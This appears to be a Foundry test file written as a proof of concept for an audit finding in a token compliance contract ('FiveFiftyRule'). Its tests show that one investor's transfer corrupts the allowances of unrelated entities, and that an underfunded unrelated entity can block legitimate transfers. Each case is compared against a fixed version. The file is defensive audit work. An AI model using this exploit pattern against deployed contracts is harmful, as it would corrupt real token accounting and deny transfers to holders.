// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    FiveFiftyRule,
    FiveFiftyRuleFixed,
    MiniToken
} from "./63781-updating-the-entity-allowance-when-the-individual-belongs-to.sol";

contract RemoraFiveFiftyEntityAllowanceTest is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    address internal constant INVESTOR_A = address(0xA1);
    address internal constant INVESTOR_B = address(0xB2);
    address internal constant INVESTOR_C = address(0xC3);
    address internal constant INVESTOR_D = address(0xD4);
    address internal constant ENTITY_A = address(0xE1);
    address internal constant ENTITY_B = address(0xE2);
    address internal constant ENTITY_C = address(0xE3);
    address internal constant ENTITY_D = address(0xE4);
    address internal constant NEUTRAL = address(0xFF);

    uint256 internal constant GROUP_A = 1;
    uint256 internal constant GROUP_B = 2;
    uint256 internal constant AMOUNT = 1000;
    uint64 internal constant INITIAL_ALLOWANCE = 1_000_000;

    // ── shared scenario builder (the finding's exact table) ──
    function _build(address r) internal {
        FiveFiftyRule fr = FiveFiftyRule(r);
        fr.setIndividual(INVESTOR_A, false, 1, GROUP_A);
        fr.setIndividual(INVESTOR_B, false, 3, GROUP_A);
        fr.setIndividual(INVESTOR_C, false, 0, GROUP_B);
        fr.setIndividual(INVESTOR_D, false, 0, GROUP_B);

        address[] memory gA = new address[](2);
        gA[0] = INVESTOR_A;
        gA[1] = INVESTOR_B;
        fr.setGroup(GROUP_A, 4, gA);
        address[] memory gB = new address[](2);
        gB[0] = INVESTOR_C;
        gB[1] = INVESTOR_D;
        fr.setGroup(GROUP_B, 0, gB);

        fr.setEntity(ENTITY_A, INITIAL_ALLOWANCE, INVESTOR_B, 5000);
        fr.setEntity(ENTITY_B, INITIAL_ALLOWANCE, INVESTOR_B, 5000);
        fr.setEntity(ENTITY_C, INITIAL_ALLOWANCE, INVESTOR_A, 5000);
        fr.setEntity(ENTITY_D, INITIAL_ALLOWANCE, INVESTOR_B, 5000);

        address[] memory feA = new address[](2);
        feA[0] = ENTITY_A;
        feA[1] = ENTITY_C;
        fr.setFindEntity(INVESTOR_A, feA);
        address[] memory feB = new address[](3);
        feB[0] = ENTITY_A;
        feB[1] = ENTITY_B;
        feB[2] = ENTITY_D;
        fr.setFindEntity(INVESTOR_B, feB);
        address[] memory feC = new address[](3);
        feC[0] = ENTITY_B;
        feC[1] = ENTITY_C;
        feC[2] = ENTITY_D;
        fr.setFindEntity(INVESTOR_C, feC);
    }

    // 1) Primary harm: sender-path accounting corruption of an unrelated entity.
    function test_exploit_transferFromInvestorA_corruptsUnrelatedEntityB() public {
        Exploit e = new Exploit();
        e.run();

        // equity 5000, denom 10000 → factor 2; amount 1000 → adjusted 2000.
        assertEq(e.entityB_before(), INITIAL_ALLOWANCE, "entityB baseline");
        assertEq(e.entityB_after(), INITIAL_ALLOWANCE + 2000, "entityB mutated by InvestorA transfer");
        assertEq(e.corruptionDelta(), 2000, "unrelated-entity allowance corruption magnitude");
        assertTrue(e.corruptionDelta() != 0, "corruption is non-zero (InvestorA is not part of EntityB)");

        MiniToken marker = MiniToken(e.markerAddr());
        assertEq(marker.balanceOf(SINK), 2000, "marker records corrupted allowance at SINK");
    }

    // Detailed accounting: EntityB AND EntityD (both unrelated to InvestorA) mutated;
    // EntityA (InvestorA IS a member) also mutated because InvestorB is its catalyst.
    function test_exploit_multipleUnrelatedEntitiesMutated() public {
        FiveFiftyRule fr = new FiveFiftyRule();
        _build(address(fr));

        uint64 bA = fr.getEntityAllowance(ENTITY_A);
        uint64 bB = fr.getEntityAllowance(ENTITY_B);
        uint64 bC = fr.getEntityAllowance(ENTITY_C);
        uint64 bD = fr.getEntityAllowance(ENTITY_D);

        fr.canTransfer(INVESTOR_A, NEUTRAL, AMOUNT);

        // InvestorA legitimately updates EntityC (InvestorA is its catalyst & member).
        assertEq(fr.getEntityAllowance(ENTITY_C), bC + 2000, "EntityC (InvestorA's own) updated");
        // Co-member InvestorB drags in EntityA/EntityB/EntityD.
        assertEq(fr.getEntityAllowance(ENTITY_A), bA + 2000, "EntityA also mutated via InvestorB");
        assertEq(fr.getEntityAllowance(ENTITY_B), bB + 2000, "EntityB (UNRELATED to InvestorA) mutated");
        assertEq(fr.getEntityAllowance(ENTITY_D), bD + 2000, "EntityD (UNRELATED to InvestorA) mutated");
    }

    // 2) Negative control: fixed contract leaves entities InvestorA is not part of untouched.
    function test_control_fixed_doesNotTouchUnrelatedEntities() public {
        FiveFiftyRuleFixed fr = new FiveFiftyRuleFixed();
        _build(address(fr));

        uint64 bA = fr.getEntityAllowance(ENTITY_A);
        uint64 bB = fr.getEntityAllowance(ENTITY_B);
        uint64 bC = fr.getEntityAllowance(ENTITY_C);
        uint64 bD = fr.getEntityAllowance(ENTITY_D);

        fr.canTransfer(INVESTOR_A, NEUTRAL, AMOUNT);

        // Only entities InvestorA is actually part of are updated.
        assertEq(fr.getEntityAllowance(ENTITY_C), bC + 2000, "EntityC (InvestorA member) updated");
        assertEq(fr.getEntityAllowance(ENTITY_A), bA + 2000, "EntityA (InvestorA member) updated");
        assertEq(fr.getEntityAllowance(ENTITY_B), bB, "EntityB (unrelated) UNCHANGED under fix");
        assertEq(fr.getEntityAllowance(ENTITY_D), bD, "EntityD (unrelated) UNCHANGED under fix");
    }

    // 3) Receiver-path DoS: an under-allowanced UNRELATED entity blocks a legit transfer.
    function test_exploit_receiverPathDoS_vulnerableBlocks_fixedAllows() public {
        // Vulnerable: EntityB (unrelated to receiver InvestorA) is under-allowanced.
        FiveFiftyRule vuln = new FiveFiftyRule();
        _build(address(vuln));
        // Give the catalyst-of-receiver entities plenty, but starve unrelated EntityB.
        vuln.setEntity(ENTITY_A, 1_000_000, INVESTOR_B, 5000);
        vuln.setEntity(ENTITY_C, 1_000_000, INVESTOR_A, 5000);
        vuln.setEntity(ENTITY_B, 1999, INVESTOR_B, 5000); // < adjusted 2000
        vuln.setEntity(ENTITY_D, 1_000_000, INVESTOR_B, 5000);

        // A legitimate transfer TO InvestorA is blocked by unrelated EntityB's shortfall.
        bool okVuln = vuln.canTransfer(NEUTRAL, INVESTOR_A, AMOUNT);
        assertFalse(okVuln, "vulnerable: unrelated EntityB shortfall blocks the transfer (DoS)");

        // Fixed: EntityB is never consulted for InvestorA, so the transfer is allowed.
        FiveFiftyRuleFixed fixed_ = new FiveFiftyRuleFixed();
        _build(address(fixed_));
        fixed_.setEntity(ENTITY_A, 1_000_000, INVESTOR_B, 5000);
        fixed_.setEntity(ENTITY_C, 1_000_000, INVESTOR_A, 5000);
        fixed_.setEntity(ENTITY_B, 1999, INVESTOR_B, 5000);
        fixed_.setEntity(ENTITY_D, 1_000_000, INVESTOR_B, 5000);

        bool okFixed = fixed_.canTransfer(NEUTRAL, INVESTOR_A, AMOUNT);
        assertTrue(okFixed, "fixed: unrelated EntityB is ignored, transfer proceeds");
    }
}
